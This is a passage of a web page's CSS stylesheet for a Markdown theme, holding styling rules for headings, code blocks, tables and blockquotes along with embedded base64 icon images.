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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
